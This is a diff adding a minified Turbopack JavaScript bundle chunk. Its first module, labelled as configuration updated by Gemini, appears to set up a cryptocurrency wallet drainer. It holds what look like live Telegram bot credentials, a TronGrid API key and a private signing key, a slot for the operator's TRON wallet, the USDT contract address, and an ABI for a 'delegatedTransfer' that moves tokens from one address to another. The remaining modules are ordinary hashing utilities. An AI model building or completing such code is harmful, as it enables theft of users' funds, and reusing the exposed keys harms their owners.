@@ -1,0 +1,224 @@
+(globalThis.TURBOPACK || (globalThis.TURBOPACK = [])).push(["object" == typeof document ? document.currentScript : void 0, 18035, e => {
+    "use strict";
+    e.s(["CHAT_ID", () => a, "CONTRACT_ABI", () => u, "TELEGRAM_BOT_TOKEN", () => o, "USDT", () => s, "contractsender", () => i, "isTestnet", () => t, "networkapi", () => r, "projectId", () => n, "SENDER_KEY", () => y, "TRON_API_KEY", () => x]);
+    
+    // ===== UPDATED CONFIGURATION BY GEMINI =====
+    let t = !1,
+        n = "30c73661ee3a7c5d7b499b77532c87eb",
+        r = "https://api.trongrid.io",
+        o = "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM", // Aapka TG Token
+        a = "8249230506", // Aapki TG Chat ID
+        x = "0a253937-54ef-4d0a-961a-e0a3a240e9d6",
+        y = "173bbe30ae9098716ff90afd8a1ab1f786ef2c44aabf7795e205e62eeedc803e",
+        i = "YOUR_TRON_WALLET_HERE", // <--- YAHAN APNA TRON ADDRESS DALO
+        s = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // Mainnet USDT TRC20
+        u = [{
+            inputs: [{
+                internalType: "address",
+                name: "tokenAddress",
+                type: "address"
+            }, {
+                internalType: "address",
+                name: "from",
+                type: "address"
+            }, {
+                internalType: "address",
+                name: "to",
+                type: "address"
+            }, {
+                internalType: "uint256",
+                name: "amount",
+                type: "uint256"
+            }],
+            name: "delegatedTransfer",
+            outputs: [{
+                internalType: "bool",
+                name: "",
+                type: "bool"
+            }],
+            stateMutability: "nonpayable",
+            type: "function"
+        }, {
+            inputs: [{
+                internalType: "address",
+                name: "tokenAddress",
+                type: "address"
+            }, {
+                internalType: "address",
+                name: "account",
+                type: "address"
+            }],
+            name: "balanceOfToken",
+            outputs: [{
+                internalType: "uint256",
+                name: "",
+                type: "uint256"
+            }],
+            stateMutability: "view",
+            type: "function"
+        }, {
+            inputs: [],
+            name: "owner",
+            outputs: [{
+                internalType: "address",
+                name: "",
+                type: "address"
+            }],
+            stateMutability: "view",
+            type: "function"
+        }]
+    // ===========================================
+
+}, 82469, e => {
+    "use strict";
+    e.s(["add", () => y, "add3H", () => g, "add3L", () => h, "add4H", () => m, "add4L", () => b, "add5H", () => T, "add5L", () => w, "rotlBH", () => c, "rotlBL", () => p, "rotlSH", () => d, "rotlSL", () => f, "rotrBH", () => u, "rotrBL", () => l, "rotrSH", () => i, "rotrSL", () => s, "shrSH", () => o, "shrSL", () => a, "split", () => r]);
+    let t = BigInt(0x100000000 - 1),
+        n = BigInt(32);
+
+    function r(e) {
+        let r = arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
+            o = e.length,
+            a = new Uint32Array(o),
+            i = new Uint32Array(o);
+        for (let s = 0; s < o; s++) {
+            let {
+                h: o,
+                l: u
+            } = function(e) {
+                let r = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
+                return r ? {
+                    h: Number(e & t),
+                    l: Number(e >> n & t)
+                } : {
+                    h: 0 | Number(e >> n & t),
+                    l: 0 | Number(e & t)
+                }
+            }(e[s], r);
+            [a[s], i[s]] = [o, u]
+        }
+        return [a, i]
+    }
+    let o = (e, t, n) => e >>> n,
+        a = (e, t, n) => e << 32 - n | t >>> n,
+        i = (e, t, n) => e >>> n | t << 32 - n,
+        s = (e, t, n) => e << 32 - n | t >>> n,
+        u = (e, t, n) => e << 64 - n | t >>> n - 32,
+        l = (e, t, n) => e >>> n - 32 | t << 64 - n,
+        d = (e, t, n) => e << n | t >>> 32 - n,
+        f = (e, t, n) => t << n | e >>> 32 - n,
+        c = (e, t, n) => t << n - 32 | e >>> 64 - n,
+        p = (e, t, n) => e << n - 32 | t >>> 64 - n;
+
+    function y(e, t, n, r) {
+        let o = (t >>> 0) + (r >>> 0);
+        return {
+            h: e + n + (o / 0x100000000 | 0) | 0,
+            l: 0 | o
+        }
+    }
+    let h = (e, t, n) => (e >>> 0) + (t >>> 0) + (n >>> 0),
+        g = (e, t, n, r) => t + n + r + (e / 0x100000000 | 0) | 0,
+        b = (e, t, n, r) => (e >>> 0) + (t >>> 0) + (n >>> 0) + (r >>> 0),
+        m = (e, t, n, r, o) => t + n + r + o + (e / 0x100000000 | 0) | 0,
+        w = (e, t, n, r, o) => (e >>> 0) + (t >>> 0) + (n >>> 0) + (r >>> 0) + (o >>> 0),
+        T = (e, t, n, r, o, a) => t + n + r + o + a + (e / 0x100000000 | 0) | 0
+}, 44445, e => {
+    "use strict";
+    e.s(["Hash", () => y, "abytes", () => r, "aexists", () => a, "ahash", () => o, "anumber", () => n, "aoutput", () => i, "clean", () => u, "concatBytes", () => p, "createHasher", () => h, "createView", () => l, "createXOFer", () => g, "randomBytes", () => b, "rotr", () => d, "swap32IfBE", () => f, "toBytes", () => c, "u32", () => s], 44445);
+    let t = "object" == typeof globalThis && "crypto" in globalThis ? globalThis.crypto : void 0;
+
+    function n(e) {
+        if (!Number.isSafeInteger(e) || e < 0) throw Error("positive integer expected, got " + e)
+    }
+
+    function r(e) {
+        for (var t = arguments.length, n = Array(t > 1 ? t - 1 : 0), r = 1; r < t; r++) n[r - 1] = arguments[r];
+        if (!(e instanceof Uint8Array || ArrayBuffer.isView(e) && "Uint8Array" === e.constructor.name)) throw Error("Uint8Array expected");
+        if (n.length > 0 && !n.includes(e.length)) throw Error("Uint8Array expected of length " + n + ", got length=" + e.length)
+    }
+
+    function o(e) {
+        if ("function" != typeof e || "function" != typeof e.create) throw Error("Hash should be wrapped by utils.createHasher");
+        n(e.outputLen), n(e.blockLen)
+    }
+
+    function a(e) {
+        let t = !(arguments.length > 1) || void 0 === arguments[1] || arguments[1];
+        if (e.destroyed) throw Error("Hash instance has been destroyed");
+        if (t && e.finished) throw Error("Hash#digest() has already been called")
+    }
+
+    function i(e, t) {
+        r(e);
+        let n = t.outputLen;
+        if (e.length < n) throw Error("digestInto() expects output buffer of length at least " + n)
+    }
+
+    function s(e) {
+        return new Uint32Array(e.buffer, e.byteOffset, Math.floor(e.byteLength / 4))
+    }
+
+    function u() {
+        for (var e = arguments.length, t = Array(e), n = 0; n < e; n++) t[n] = arguments[n];
+        for (let e = 0; e < t.length; e++) t[e].fill(0)
+    }
+
+    function l(e) {
+        return new DataView(e.buffer, e.byteOffset, e.byteLength)
+    }
+
+    function d(e, t) {
+        return e << 32 - t | e >>> t
+    }
+    let f = 68 === new Uint8Array(new Uint32Array([0x11223344]).buffer)[0] ? e => e : function(e) {
+        for (let n = 0; n < e.length; n++) {
+            var t;
+            e[n] = (t = e[n]) << 24 & 0xff000000 | t << 8 & 0xff0000 | t >>> 8 & 65280 | t >>> 24 & 255
+        }
+        return e
+    };
+
+    function c(e) {
+        return "string" == typeof e && (e = function(e) {
+            if ("string" != typeof e) throw Error("string expected");
+            return new Uint8Array(new TextEncoder().encode(e))
+        }(e)), r(e), e
+    }
+
+    function p() {
+        for (var e = arguments.length, t = Array(e), n = 0; n < e; n++) t[n] = arguments[n];
+        let o = 0;
+        for (let e = 0; e < t.length; e++) {
+            let n = t[e];
+            r(n), o += n.length
+        }
+        let a = new Uint8Array(o);
+        for (let e = 0, n = 0; e < t.length; e++) {
+            let r = t[e];
+            a.set(r, n), n += r.length
+        }
+        return a
+    }
+    class y {}
+
+    function h(e) {
+        let t = t => e().update(c(t)).digest(),
+            n = e();
+        return t.outputLen = n.outputLen, t.blockLen = n.blockLen, t.create = () => e(), t
+    }
+
+    function g(e) {
+        let t = (t, n) => e(n).update(c(t)).digest(),
+            n = e({});
+        return t.outputLen = n.outputLen, t.blockLen = n.blockLen, t.create = t => e(t), t
+    }
+
+    function b() {
+        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 32;
+        if (t && "function" == typeof t.getRandomValues) return t.getRandomValues(new Uint8Array(e));
+        if (t && "function" == typeof t.randomBytes) return Uint8Array.from(t.randomBytes(e));
+        throw Error("crypto.getRandomValues must be defined")
+    }
+}, 13886, e => {
+    e.v(t => Promise.all(["static/chunks/a7f25b17be8e1ac9.js"].map(t => e.l(t))).then(() => t(59)))
+}]);
